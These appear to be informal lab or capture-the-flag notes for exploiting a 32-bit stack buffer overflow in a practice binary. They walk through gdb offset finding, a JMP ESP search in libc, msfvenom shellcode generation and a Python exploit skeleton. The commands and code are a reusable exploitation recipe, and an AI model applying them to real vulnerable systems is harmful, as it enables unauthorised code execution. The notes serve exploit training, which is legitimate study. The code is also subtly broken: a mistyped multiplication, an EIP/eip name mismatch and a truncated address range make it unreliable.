https://wiremask.eu/tools/buffer-overflow-pattern-generator/
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!DEMO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!



file func
    ELF 32 bit, dynamically linked
md5sum 
strings func
    look for things that stand out
#DYNAMIC ANALYSIS
      run it- ./func
        try interacting
#TRY TO CRASH IT
      python3 -c "print ('A'*200)" | ./func
      ./func <<< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        "Segmentation fault (core dumped)"


      #!/usr/bin/python
        #GDB
      # General Buffer Overflow Process:
      #step 0: Perform reverse engineering/identfy vulnerability
      #step 1: find the bufer size/offset
      #step 2: Validate EIP Overwrite
      #ste[ 3: identify bad charackters to exclude from shellcode 
      #step 4: Find a valid JMP ESP (assembly instruction)
      #step 5:Generate shellcode and run exploit


#STEP 0!!!           
#Run Func in GDB
           
#disassemble main
           
#disass main
      disass main
#disass getuserinput
            disass getuserinput
               puts and gets
#pdisass getuserinput
           colorcodes vulnerability
#STEP 1!!! FIND BUFFER SIZE/OFSET
      #run <<< *enter string*
        look at registers
        look at ESP, trying to get to EIP
        grab memory address of EIP copy into website at top of this page to find the offset
#OFFSET IS 62
   #run <<<  $(python3 -c 'print("A" 8 62 + "B" * 4)')
           #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
   #RUN GDB IN A CLEAN ENV
   # env - gdb ./func


#env - gdb ./func
#unset env - show env
#unset env LINES
#unset env COLUMNS

#Search for JMP ESP
#info proc map (inside gdb)

#libc mem range: 0xf7ddd000 0xf7af000
#JMP ESP = ff e4
#find /b 0xf7ddd000, 0xf7faf000, 0xff, 0xe4
    
    #copy first couple
        #GDB gives us big-endian
        #Convert to little-endian
        #0x\f7\dd\fb\59 --> /x59/xfb/xdd/xf7
        #0x\f7\f5\48\ab --> /xab/x48/xf5/xf7
        #0x\f7\f6\05\fb --> /xfb/x05/xf6/xf7
          

           buffer = "A" * 62
           #eip = "B" * 4
           EIP = "\x59\xfb\xdd\xf7"
           nop = '\x90' *5

           *enter buf results*



           # payload 
           #msfvenom
           #msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
                copy back the results of that command underneath last line of code^^^
           

           print(buffer + eip + nop+ buf)

#call it 
./func <<< $(python exploit.py)       -- (outside of gdb)
           




























           
